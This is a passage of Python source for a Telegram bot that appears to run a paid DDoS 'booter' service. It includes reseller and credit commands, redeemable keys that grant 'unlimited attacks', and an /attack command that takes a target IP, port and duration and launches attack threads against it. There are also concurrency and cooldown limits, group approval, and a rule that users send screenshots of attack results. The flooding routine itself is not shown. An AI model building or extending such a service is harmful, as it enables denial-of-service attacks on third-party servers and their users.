        logger.error(f"Error in add_reseller command: {e}")
        log_error(e, user_id=message.from_user.id, command="add_reseller")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= REMOVE RESELLER COMMAND =================
@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can remove resellers.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /remove_reseller &lt;user_id&gt;")
            return
        
        try:
            user_id = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Invalid user ID.")
            return
        
        if not is_reseller(user_id):
            bot.reply_to(message, f"⚠️ User {user_id} is not a reseller.")
            return
        
        if is_owner(user_id):
            bot.reply_to(message, "❌ Cannot remove the owner.")
            return
        
        resellers_col.delete_one({"_id": str(user_id)})
        log_admin_action(message.from_user.id, "remove_reseller", f"Removed reseller {user_id}")
        
        bot.reply_to(message, 
                    f"✅ <b>Reseller Removed</b>\n\n"
                    f"User ID: <code>{user_id}</code>\n"
                    f"Removed by: {message.from_user.id}")
        
        try:
            bot.send_message(user_id, 
                           f"⚠️ <b>Reseller Access Revoked</b>\n\n"
                           f"You are no longer a reseller.")
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in remove_reseller command: {e}")
        log_error(e, user_id=message.from_user.id, command="remove_reseller")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= RESELLERS LIST COMMAND =================
@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        resellers = list(resellers_col.find())
        if not resellers:
            bot.reply_to(message, "📋 No resellers configured.")
            return
        
        text = "💰 <b>Resellers</b>\n\n"
        for i, reseller in enumerate(resellers, 1):
            uid = reseller["_id"]
            credits = reseller.get("credits", 0)
            added_by = reseller.get("added_by", "Unknown")
            added_at = reseller.get("added_at", "Unknown")
            
            text += (
                f"<b>#{i}</b>\n"
                f"├ ID: <code>{uid}</code>\n"
                f"├ Credits: {credits}\n"
                f"├ Added by: {added_by}\n"
                f"└ {'─' * 30}\n\n"
            )
        
        bot.reply_to(message, text[:4000])
        
    except Exception as e:
        logger.error(f"Error in resellers command: {e}")
        log_error(e, user_id=message.from_user.id, command="resellers")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= ADD CREDIT COMMAND =================
@bot.message_handler(commands=['addcredit'])
def add_credit(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can add credits.")
            return
        
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /addcredit &lt;user_id&gt; &lt;amount&gt;")
            return
        
        try:
            user_id = int(parts[1])
            amount = int(parts[2])
        except ValueError:
            bot.reply_to(message, "❌ Invalid user ID or amount.")
            return
        
        if amount <= 0:
            bot.reply_to(message, "❌ Amount must be positive.")
            return
        
        if not is_reseller(user_id) and not is_owner(user_id):
            bot.reply_to(message, f"⚠️ User {user_id} is not a reseller.")
            return
        
        if is_owner(user_id):
            bot.reply_to(message, "👑 Owner has unlimited credits.")
            return
        
        resellers_col.update_one(
            {"_id": str(user_id)},
            {"$inc": {"credits": amount}}
        )
        
        reseller = resellers_col.find_one({"_id": str(user_id)})
        new_credits = reseller.get("credits", 0)
        
        log_admin_action(message.from_user.id, "add_credit", f"Added {amount} credits to {user_id}")
        
        bot.reply_to(message, 
                    f"✅ <b>Credits Added</b>\n\n"
                    f"User ID: <code>{user_id}</code>\n"
                    f"Added: +{amount} credits\n"
                    f"New Balance: {new_credits} credits")
        
        try:
            bot.send_message(user_id, 
                           f"✅ <b>Credits Added</b>\n\n"
                           f"{amount} credits have been added to your account.\n"
                           f"New Balance: {new_credits} credits")
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in addcredit command: {e}")
        log_error(e, user_id=message.from_user.id, command="addcredit")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= REMOVE CREDIT COMMAND =================
@bot.message_handler(commands=['removecredit'])
def remove_credit(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can remove credits.")
            return
        
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /removecredit &lt;user_id&gt; &lt;amount&gt;")
            return
        
        try:
            user_id = int(parts[1])
            amount = int(parts[2])
        except ValueError:
            bot.reply_to(message, "❌ Invalid user ID or amount.")
            return
        
        if amount <= 0:
            bot.reply_to(message, "❌ Amount must be positive.")
            return
        
        if not is_reseller(user_id) or is_owner(user_id):
            bot.reply_to(message, "⚠️ User is not a reseller or is the owner.")
            return
        
        reseller = resellers_col.find_one({"_id": str(user_id)})
        current_credits = reseller.get("credits", 0)
        
        if current_credits < amount:
            bot.reply_to(message, 
                        f"❌ <b>Insufficient Credits</b>\n\n"
                        f"Current balance: {current_credits}\n"
                        f"Requested removal: {amount}")
            return
        
        resellers_col.update_one(
            {"_id": str(user_id)},
            {"$inc": {"credits": -amount}}
        )
        
        new_credits = current_credits - amount
        
        log_admin_action(message.from_user.id, "remove_credit", f"Removed {amount} credits from {user_id}")
        
        bot.reply_to(message, 
                    f"✅ <b>Credits Removed</b>\n\n"
                    f"User ID: <code>{user_id}</code>\n"
                    f"Removed: -{amount} credits\n"
                    f"New Balance: {new_credits} credits")
        
        try:
            bot.send_message(user_id, 
                           f"⚠️ <b>Credits Removed</b>\n\n"
                           f"{amount} credits have been removed from your account.\n"
                           f"New Balance: {new_credits} credits")
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in removecredit command: {e}")
        log_error(e, user_id=message.from_user.id, command="removecredit")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= RESELLER INFO COMMAND =================
@bot.message_handler(commands=['reseller_info'])
def reseller_info(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /reseller_info &lt;user_id&gt;")
            return
        
        try:
            user_id = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Invalid user ID.")
            return
        
        if not is_reseller(user_id) and not is_owner(user_id):
            bot.reply_to(message, f"⚠️ User {user_id} is not a reseller.")
            return
        
        if is_owner(user_id):
            bot.reply_to(message, "👑 <b>Owner Info</b>\n\nUnlimited credits and full access.")
            return
        
        reseller = resellers_col.find_one({"_id": str(user_id)})
        credits = reseller.get("credits", 0)
        added_by = reseller.get("added_by", "Unknown")
        added_at = reseller.get("added_at", "Unknown")
        
        active_keys = keys_col.count_documents({
            "created_by": user_id,
            "redeemed_by": None,
            "expires": {"$gt": datetime.now().isoformat()}
        })
        redeemed_keys = keys_col.count_documents({
            "created_by": user_id,
            "redeemed_by": {"$ne": None}
        })
        total_keys = keys_col.count_documents({"created_by": user_id})
        
        info_text = (
            f"💰 <b>Reseller Info</b>\n"
            f"╔════════════════════════╗\n"
            f"║   💰 RESELLER DETAILS ║\n"
            f"╚════════════════════════╝\n\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
            f"💳 <b>Credits:</b> {credits}\n"
            f"🔑 <b>Total Keys:</b> {total_keys}\n"
            f"  • Active: {active_keys}\n"
            f"  • Redeemed: {redeemed_keys}\n"
            f"👤 <b>Added by:</b> {added_by}\n"
            f"📅 <b>Added at:</b> {added_at}"
        )
        
        bot.reply_to(message, info_text)
        
    except Exception as e:
        logger.error(f"Error in reseller_info command: {e}")
        log_error(e, user_id=message.from_user.id, command="reseller_info")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= REDEEM COMMAND =================
@bot.message_handler(commands=['redeem'])
def redeem_code(message):
    try:
        user_id = message.from_user.id
        
        if is_group(message):
            bot.reply_to(message, "⚠️ Please redeem your key in private chat for security.\n\nSend me a private message and use /redeem YOUR-CODE")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, 
                        "⚠️ <b>Usage:</b> /redeem &lt;code&gt;\n\n"
                        "Example: /redeem VIP-ABC123DEF456\n\n"
                        "💡 You can get a code from our resellers.")
            return
        
        code = parts[1].upper()
        
        if blocked_codes_col.count_documents({"_id": code}) > 0:
            bot.reply_to(message, 
                        "🚫 <b>Code Blocked</b>\n\n"
                        "This code has been blocked by the bot owner.\n"
                        "Please contact the reseller you purchased from.")
            return
        
        key = keys_col.find_one({"_id": code})
        if not key:
            bot.reply_to(message, 
                        "❌ <b>Invalid Code</b>\n\n"
                        "The code you entered is invalid or doesn't exist.\n"
                        "Please check the code and try again.")
            return
        
        if key.get("redeemed_by"):
            bot.reply_to(message, 
                        "❌ <b>Code Already Used</b>\n\n"
                        "This code has already been redeemed.\n"
                        "Each code can only be used once.")
            return
        
        try:
            expires = datetime.fromisoformat(key["expires"])
        except:
            bot.reply_to(message, "❌ Invalid code format. Please contact support.")
            return
        
        if datetime.now() > expires:
            keys_col.delete_one({"_id": code})
            bot.reply_to(message, 
                        "❌ <b>Code Expired</b>\n\n"
                        "This code has expired and can no longer be used.")
            return
        
        existing_plan = plans_col.find_one({"_id": str(user_id)})
        if existing_plan:
            existing_expires = datetime.fromisoformat(existing_plan["expires"])
            if existing_expires > datetime.now():
                bot.reply_to(message, 
                            "⚠️ You already have an active plan.\n"
                            "Your new plan will replace the existing one.\n"
                            f"Existing plan expires: {format_expiry(existing_expires)}")
        
        plans_col.update_one(
            {"_id": str(user_id)}, 
            {"$set": {
                "attacks_left": -1,
                "max_duration": key.get("max_duration", get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME)),
                "cooldown": key.get("cooldown", get_setting("cooldown", DEFAULT_COOLDOWN)),
                "expires": key["expires"],
                "redeemed_code": code,
                "redeemed_at": datetime.now().isoformat(),
                "plan_type": key.get("type", "standard")
            }}, 
            upsert=True
        )
        
        keys_col.update_one(
            {"_id": code}, 
            {"$set": {
                "redeemed_by": user_id, 
                "redeemed_at": datetime.now().isoformat()
            }}
        )
        
        log_key_event("redeemed", code, redeemed_by=user_id)
        
        bot_stats_col.update_one(
            {"_id": "stats"},
            {"$inc": {"total_users_served": 1}},
            upsert=True
        )
        
        friendly_expiry = format_expiry(expires)
        duration_label = key.get("duration_label", key.get("duration_hours", 0))
        if isinstance(duration_label, int):
            duration_label = f"{duration_label} hour(s)"
        
        success_text = (
            f"✅ <b>Code Redeemed Successfully!</b>\n"
            f"╔════════════════════════╗\n"
            f"║   ✅ ACCESS GRANTED   ║\n"
            f"╚════════════════════════╝\n\n"
            f"🎯 <b>Attacks:</b> Unlimited\n"
            f"⏱️ <b>Max Duration:</b> {key.get('max_duration', DEFAULT_MAX_ATTACK_TIME)}s\n"
            f"⏳ <b>Cooldown:</b> {key.get('cooldown', DEFAULT_COOLDOWN)}s\n"
            f"📅 <b>Expires:</b> {friendly_expiry}\n"
            f"⏰ <b>Duration:</b> {duration_label}\n\n"
            f"⚡ <b>You now have unlimited attacks!</b>\n"
            f"Use /attack to start attacking.\n"
            f"Use /check_my_access to view your plan.\n\n"
            f"📸 <b>Important:</b>\n"
            f"After each attack, send a screenshot/image to continue.\n\n"
            f"💡 <b>Quick Start:</b>\n"
            f"/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;"
        )
        
        bot.reply_to(message, success_text)
        
    except Exception as e:
        logger.error(f"Error in redeem command: {e}")
        log_error(e, user_id=message.from_user.id, command="redeem")
        bot.reply_to(message, "❌ An error occurred while redeeming your code. Please try again.")

# ================= ATTACK COMMAND =================
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    try:
        if not check_access(message):
            return
        
        user_id = message.from_user.id
        
        if get_setting("feedback_system", True) and not is_admin_or_owner(user_id):
            if has_pending_feedback(user_id):
                bot.reply_to(message, 
                            "📸 <b>Feedback Required</b>\n\n"
                            "You need to submit feedback after your last attack.\n"
                            "Please send a screenshot/image of the attack result.\n\n"
                            "📤 <b>How to submit:</b>\n"
                            "1. Take a screenshot of the attack result\n"
                            "2. Send the image here\n"
                            "3. You can add a caption if you want\n\n"
                            "✅ After submitting, you can attack again!")
                return
        
        max_concurrent_user, max_duration, cooldown_seconds = get_user_limits(user_id)
        
        if is_group(message):
            group_max_concurrent, group_max_time, group_cooldown = get_group_limits(message.chat.id)
            
            if not is_owner(user_id) and not is_admin(user_id):
                max_concurrent_user = min(max_concurrent_user, group_max_concurrent)
                max_duration = min(max_duration, group_max_time)
                cooldown_seconds = max(cooldown_seconds, group_cooldown)
                
                total_active_in_group = get_group_active_attacks_count(message.chat.id)
                if total_active_in_group >= group_max_concurrent:
                    bot.reply_to(message, 
                                f"❌ <b>Group Attack Limit Reached</b>\n\n"
                                f"The group can only run {group_max_concurrent} attack(s) at a time.\n"
                                f"Current active: {total_active_in_group}/{group_max_concurrent}\n"
                                f"Please wait for ongoing attacks to finish.")
                    return
                
                active_in_group = get_user_active_attacks_in_group(user_id, message.chat.id)
                if active_in_group >= max_concurrent_user:
                    bot.reply_to(message, 
                                f"❌ <b>Your Attack Limit Reached</b>\n\n"
                                f"You already have {active_in_group} active attack(s) in this group.\n"
                                f"Maximum concurrent attacks: {max_concurrent_user}")
                    return
        
        if not is_owner(user_id) and not is_admin(user_id):
            remaining_cd = get_user_cooldown(user_id)
            if remaining_cd > 0:
                bot.reply_to(message, 
                            f"⏳ <b>Cooldown Active</b>\n\n"
                            f"Please wait {format_duration(remaining_cd)} before starting a new attack.\n"
                            f"Use /status to monitor active attacks.")
                return
            
            if not is_group(message) and user_has_active_attack(user_id) and max_concurrent_user <= 1:
                bot.reply_to(message, 
                            "❌ <b>Attack Already Running</b>\n\n"
                            "You already have an active attack.\n"
                            "Wait for it to complete before starting a new one.\n"
                            "Use /status to check progress.")
                return
        
        active_count = get_active_attack_count()
        max_concurrent_global = get_setting("max_concurrent_attacks", DEFAULT_MAX_CONCURRENT)
        
        if active_count >= max_concurrent_global and not is_admin(user_id) and not is_owner(user_id):
            bot.reply_to(message, 
                        f"❌ <b>All Attack Slots Busy</b>\n\n"
                        f"Active attacks: {active_count}/{max_concurrent_global}\n"
                        f"Please try again in a few moments.\n"
                        f"Use /status to monitor slots.")
            return
        
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, 
                        "⚠️ <b>Usage:</b> /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;\n\n"
                        "Example: /attack 192.168.1.1 8080 60\n\n"
                        "📋 <b>Parameters:</b>\n"
                        "• IP: Target IP address\n"
                        "• Port: Target port (1-65535)\n"
                        "• Time: Duration in seconds\n\n"
                        f"⏱️ Max time: {max_duration}s")
            return
        
        target, port_str, duration_str = parts[1], parts[2], parts[3]
        
        if not validate_target(target):
            bot.reply_to(message, 
                        "❌ <b>Invalid IP Address</b>\n\n"
                        "Please enter a valid IPv4 address.\n"
                        "Example: 192.168.1.1")
            return
        
        try:
            port = int(port_str)
            if port < 1 or port > 65535:
                raise ValueError
        except ValueError:
            bot.reply_to(message, 
                        "❌ <b>Invalid Port</b>\n\n"
                        "Port must be a number between 1 and 65535.\n"
                        "Example: 8080")
            return
        
        try:
            duration = int(duration_str)
            if duration <= 0:
                raise ValueError
        except ValueError:
            bot.reply_to(message, 
                        "❌ <b>Invalid Duration</b>\n\n"
                        "Duration must be a positive number.\n"
                        f"Maximum allowed: {max_duration}s")
            return
        
        if not is_owner(user_id) and not is_admin(user_id) and duration > max_duration:
            bot.reply_to(message, 
                        f"❌ <b>Duration Limit Exceeded</b>\n\n"
                        f"Your maximum attack duration is {max_duration}s.\n"
                        f"Requested: {duration}s")
            return
        
        if duration > 600:
            bot.reply_to(message, 
                        "❌ <b>Maximum Duration Exceeded</b>\n\n"
                        "The absolute maximum attack duration is 600 seconds (10 minutes).")
            return
        
        blocked, remaining = is_port_blocked(target, port)
        if blocked:
            mins = remaining // 60
            secs = remaining % 60
            bot.reply_to(message, 
                        f"🚫 <b>Port Blocked</b>\n\n"
                        f"🎯 {target}:{port}\n"
                        f"⏳ Blocked for {mins}m {secs}s more\n\n"
                        f"This IP:Port combination is temporarily blocked by the admin.")
            return
        
        if get_setting("port_protection", False) and not is_owner(user_id) and not is_admin(user_id):
            protected, p_remaining = check_port_protection(user_id, target, port)
            if protected:
                mins = p_remaining // 60
                secs = p_remaining % 60
                bot.reply_to(message, 
                            f"🛡️ <b>Port Protection Active</b>\n\n"
                            f"🎯 {target}:{port}\n"
                            f"⏳ You can attack the same IP:Port after {mins}m {secs}s\n\n"
                            f"This protects targets from repeated attacks.")
                return
        
        attack_id = f"{user_id}_{int(datetime.now().timestamp())}"
        
        with _attack_lock:
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration),
                'chat_type': message.chat.type,
                'chat_id': message.chat.id if is_group(message) else None
            }
        
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, cooldown_seconds))
        thread.daemon = True
        thread.start()
        
    except Exception as e:
        logger.error(f"Error in attack command: {e}")
        log_error(e, user_id=message.from_user.id, command="attack")
        try:
            bot.reply_to(message, "❌ An error occurred while starting the attack. Please try again.")
        except:
            pass

# ================= FEEDBACK MANAGEMENT COMMANDS =================

@bot.message_handler(commands=['view_feedback'])
def view_feedback_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        submissions = get_feedback_submissions(limit=20, reviewed=False)
        pending_count = get_pending_feedback_count()
        
        if not submissions:
            bot.reply_to(message, f"📋 No pending feedback submissions.\n\nTotal pending users: {pending_count}")
            return
        
        text = f"📸 <b>Pending Feedback</b>\n"
        text += f"╔════════════════════════╗\n"
        text += f"║   📸 PENDING LIST     ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"📊 Total pending: {pending_count}\n"
        text += f"📋 Showing: {len(submissions)} submissions\n\n"
        
        for i, sub in enumerate(submissions, 1):
            user_id = sub.get("user_id", "Unknown")
            submitted_at = sub.get("submitted_at", "Unknown")
            attack_data = sub.get("attack_data", {})
            
            try:
                dt = datetime.fromisoformat(submitted_at)
                submitted_at = dt.strftime("%Y-%m-%d %H:%M")
            except:
                pass
            
            text += (
                f"<b>#{i}</b>\n"
                f"├ 👤 User: <code>{user_id}</code>\n"
                f"├ 🕒 Time: {submitted_at}\n"
            )
            
            if attack_data:
                target = attack_data.get("target", "N/A")
                port = attack_data.get("port", "N/A")
                duration = attack_data.get("duration", "N/A")
                text += f"├ 🎯 Attack: {target}:{port} ({duration}s)\n"
            
            text += f"├ 📎 ID: <code>{sub['_id']}</code>\n"
            text += f"└ {'─' * 30}\n\n"
        
        text += "\n💡 Use /review_feedback &lt;id&gt; to mark as reviewed"
        
        bot.reply_to(message, text[:4000])
        
    except Exception as e:
        logger.error(f"Error in view_feedback command: {e}")
        log_error(e, user_id=message.from_user.id, command="view_feedback")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

@bot.message_handler(commands=['review_feedback'])
def review_feedback_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /review_feedback &lt;submission_id&gt;\n\n"
                        "Use /view_feedback to see submission IDs.")
            return
        
        submission_id = parts[1]
        
        try:
            from bson.objectid import ObjectId
            submission = feedback_submissions_col.find_one({"_id": ObjectId(submission_id)})
        except:
            bot.reply_to(message, "❌ Invalid submission ID format.")
            return
        
        if not submission:
            bot.reply_to(message, "❌ Submission not found.")
            return
        
        if submission.get("reviewed", False):
            bot.reply_to(message, "⚠️ This feedback has already been reviewed.")
            return
        
        mark_feedback_reviewed(submission["_id"], message.from_user.id)
        
        log_admin_action(message.from_user.id, "review_feedback", f"Reviewed feedback {submission_id}")
        
        bot.reply_to(message, 
                    f"✅ <b>Feedback Reviewed</b>\n\n"
                    f"📎 ID: <code>{submission_id}</code>\n"
                    f"👤 User: <code>{submission.get('user_id', 'Unknown')}</code>\n"
                    f"🕒 Reviewed by: {message.from_user.id}\n\n"
                    f"✅ This feedback has been marked as reviewed.")
        
    except Exception as e:
        logger.error(f"Error in review_feedback command: {e}")
        log_error(e, user_id=message.from_user.id, command="review_feedback")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

@bot.message_handler(commands=['feedback_stats'])
def feedback_stats_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        total_submissions = feedback_submissions_col.count_documents({})
        pending_submissions = feedback_submissions_col.count_documents({"reviewed": False})
        reviewed_submissions = feedback_submissions_col.count_documents({"reviewed": True})
        pending_users = get_pending_feedback_count()
        
        week_ago = (datetime.now() - timedelta(days=7)).isoformat()
        week_submissions = feedback_submissions_col.count_documents({
            "submitted_at": {"$gte": week_ago}
        })
        
        stats_text = (
            f"📸 <b>Feedback Statistics</b>\n"
            f"╔════════════════════════╗\n"
            f"║   📸 FEEDBACK STATS   ║\n"
            f"╚════════════════════════╝\n\n"
            f"📊 <b>Total Submissions:</b> {total_submissions}\n"
            f"⏳ <b>Pending Review:</b> {pending_submissions}\n"
            f"✅ <b>Reviewed:</b> {reviewed_submissions}\n"
            f"👤 <b>Users Waiting:</b> {pending_users}\n"
            f"📅 <b>Last 7 Days:</b> {week_submissions}\n\n"
            f"📋 <b>Status:</b>\n"
            f"• Feedback System: {'✅ Enabled' if get_setting('feedback_system', True) else '❌ Disabled'}\n"
            f"• Image Required: {'✅ Yes' if get_setting('feedback_require_image', True) else '❌ No'}\n\n"
            f"💡 Use /view_feedback to see pending submissions"
        )
        
        bot.reply_to(message, stats_text)
        
    except Exception as e:
        logger.error(f"Error in feedback_stats command: {e}")
        log_error(e, user_id=message.from_user.id, command="feedback_stats")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= STATUS COMMAND =================
def generate_status_text(user_id=None):
    active_count = get_active_attack_count()
    max_global = get_setting("max_concurrent_attacks", DEFAULT_MAX_CONCURRENT)
    max_time_setting = get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)
    pending_feedback = get_pending_feedback_count()
    
    text = (
        f"⚡ <b>ATTACK STATUS</b>\n"
        f"╔════════════════════════╗\n"
        f"║   ⚡ LIVE MONITOR     ║\n"
        f"╚════════════════════════╝\n\n"
        f"🔥 <b>Active Attacks:</b> {active_count}/{max_global}\n"
        f"📸 <b>Pending Feedback:</b> {pending_feedback}\n\n"
    )
    
    if active_count == 0:
        text += "📭 No active attacks.\n\n"
    else:
        with _attack_lock:
            now = datetime.now()
            for i, attack in enumerate(active_attacks.values(), 1):
                if attack['end_time'] > now:
                    remaining = int((attack['end_time'] - now).total_seconds())
                    total_duration = attack['duration']
                    elapsed = total_duration - remaining
                    
                    progress = min(int((elapsed / total_duration) * 20), 20) if total_duration > 0 else 20
                    bar = "█" * progress + "▒" * (20 - progress)
                    percent = min(int((elapsed / total_duration) * 100), 100) if total_duration > 0 else 100
                    
                    chat_type_display = "🔒 Private" if attack.get('chat_type') == 'private' else "👥 Group"
                    
                    text += (
                        f"<b>#{i}</b> {attack['target']}:{attack['port']}\n"
                        f"├ 🎯 Target: {attack['target']}\n"
                        f"├ 🔌 Port: {attack['port']}\n"
                        f"├ ⏱ Remaining: {remaining}s / {total_duration}s\n"
                        f"├ 👤 User: {attack['user_id']}\n"
                        f"├ 📍 Location: {chat_type_display}\n"
                        f"├ 📊 {bar} {percent}%\n"
                        f"└ {'─' * 30}\n\n"
                    )
    
    text += (
        f"┌─ <b>BOT SETTINGS</b>\n"
        f"├ 🔢 Max Concurrent: {max_global}\n"
        f"├ ⏱ Max Attack Time: {max_time_setting}s\n"
        f"├ ⏳ Default Cooldown: {get_setting('cooldown', DEFAULT_COOLDOWN)}s\n"
        f"├ 🛡 Port Protection: {'✅ ON' if get_setting('port_protection') else '❌ OFF'}\n"
        f"├ 📸 Feedback: {'✅ ON' if get_setting('feedback_system') else '❌ OFF'}\n"
        f"└ 🛠 Maintenance: {'✅ ON' if get_setting('maintenance_mode') else '❌ OFF'}\n"
    )
    
    if user_id and not is_owner(user_id) and not is_admin(user_id):
        cd = get_user_cooldown(user_id)
        if cd > 0:
            text += f"\n⏳ <b>Your Cooldown:</b> {format_duration(cd)}"
        
        if has_pending_feedback(user_id):
            text += f"\n📸 <b>Feedback Pending:</b> Submit screenshot to continue"
    
    text += f"\n\n🔄 Auto-updates every 5 seconds"
    
    return text

def live_status_updater(chat_id, message_id, stop_event, user_id):
    last_text = ""
    start_time = datetime.now()
    
    while not stop_event.is_set():
        if (datetime.now() - start_time).total_seconds() > 120:
            break
        
        current_text = generate_status_text(user_id)
        if current_text != last_text:
            try:
                bot.edit_message_text(current_text, chat_id=chat_id, message_id=message_id)
                last_text = current_text
            except Exception as e:
                if "message is not modified" not in str(e):
                    logger.error(f"Status update error: {e}")
        
        time.sleep(5)
    
    try:
        final_text = generate_status_text(user_id)
        final_text += "\n\n⚠️ <b>Live monitoring stopped</b> (auto-refresh ended)"
        bot.edit_message_text(final_text, chat_id=chat_id, message_id=message_id)
    except:
        pass

@bot.message_handler(commands=['status'])
def status_command(message):
    try:
        if not check_access(message):
            return
        
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        if chat_id in live_status_trackers:
            live_status_trackers[chat_id].set()
        
        initial_text = generate_status_text(user_id)
        initial_text += "\n\n🔄 <b>Live monitoring...</b>"
        sent = bot.reply_to(message, initial_text)
        
        stop_event = threading.Event()
        live_status_trackers[chat_id] = stop_event
        thread = threading.Thread(target=live_status_updater, args=(chat_id, sent.message_id, stop_event, user_id))
        thread.daemon = True
        thread.start()
        
    except Exception as e:
        logger.error(f"Error in status command: {e}")
        log_error(e, user_id=message.from_user.id, command="status")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= GROUP MANAGEMENT COMMANDS =================
@bot.message_handler(commands=['approve'])
def approve_group(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can approve groups.")
            return
        
        parts = message.text.split()
        if len(parts) < 5:
            bot.reply_to(message, 
                        "⚠️ <b>Usage:</b> /approve &lt;group_id&gt; &lt;concurrent&gt; &lt;max_time&gt; &lt;cooldown&gt;\n\n"
                        "Example: /approve -1001234567890 3 300 60\n\n"
                        "📋 <b>Parameters:</b>\n"
                        "• group_id: Group ID (negative number)\n"
                        "• concurrent: Max attacks at once (1-10)\n"
                        "• max_time: Max attack duration in seconds (30-400)\n"
                        "• cooldown: Cooldown between attacks (10-300)")
            return
        
        try:
            chat_id = int(parts[1])
            max_concurrent = int(parts[2])
            max_time = int(parts[3])
            cooldown = int(parts[4])
        except ValueError:
            bot.reply_to(message, "❌ All parameters must be numbers.")
            return
        
        if max_concurrent < 1 or max_concurrent > 10:
            bot.reply_to(message, "❌ Concurrent attacks must be between 1 and 10.")
            return
        
        if max_time < 30 or max_time > 400:
            bot.reply_to(message, "❌ Max time must be between 30 and 400 seconds.")
            return
        
        if cooldown < 10 or cooldown > 300:
            bot.reply_to(message, "❌ Cooldown must be between 10 and 300 seconds.")
            return
        
        groups_col.update_one(
            {"_id": str(chat_id)},
            {"$set": {
                "approved_by": message.from_user.id,
                "approved_at": datetime.now().isoformat()
            }},
            upsert=True
        )
        
        set_group_limits(chat_id, max_concurrent, max_time, cooldown)
        
        log_admin_action(message.from_user.id, "approve_group", f"Approved group {chat_id} with limits {max_concurrent}/{max_time}/{cooldown}")
        
        bot.reply_to(message, 
                    f"✅ <b>Group Approved Successfully!</b>\n\n"
                    f"📋 <b>Group ID:</b> <code>{chat_id}</code>\n"
                    f"📊 <b>Limits:</b>\n"
                    f"  • Max Concurrent: {max_concurrent}\n"
                    f"  • Max Time: {max_time}s\n"
                    f"  • Cooldown: {cooldown}s\n\n"
                    f"👤 Approved by: {message.from_user.id}\n"
                    f"🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        try:
            bot.send_message(chat_id, 
                           f"✅ <b>Group Approved!</b>\n\n"
                           f"This group has been approved to use the attack bot.\n"
                           f"📊 <b>Limits:</b>\n"
                           f"  • Max Concurrent: {max_concurrent}\n"
                           f"  • Max Time: {max_time}s\n"
                           f"  • Cooldown: {cooldown}s\n\n"
                           f"Use /attack to start attacking!")
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in approve command: {e}")
        log_error(e, user_id=message.from_user.id, command="approve")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

@bot.message_handler(commands=['disapprove'])
def disapprove_group(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can disapprove groups.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /disapprove &lt;group_id&gt;")
            return
        
        try:
            chat_id = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Invalid group ID.")
            return
        
        if not is_approved_group(chat_id):
            bot.reply_to(message, f"⚠️ Group {chat_id} is not approved.")
            return
        
        groups_col.delete_one({"_id": str(chat_id)})
        limits_col.delete_one({"_id": str(chat_id)})
        
        log_admin_action(message.from_user.id, "disapprove_group", f"Disapproved group {chat_id}")
        
        bot.reply_to(message, 
                    f"✅ <b>Group Disapproved</b>\n\n"
                    f"Group ID: <code>{chat_id}</code>\n"
                    f"Removed by: {message.from_user.id}")
        
        try:
            bot.send_message(chat_id, 
                           f"❌ <b>Group Disapproved</b>\n\n"
                           f"This group is no longer approved to use the attack bot.\n"
                           f"Contact the bot owner for more information.")
        except:
            pass
        
    except Exception as e:
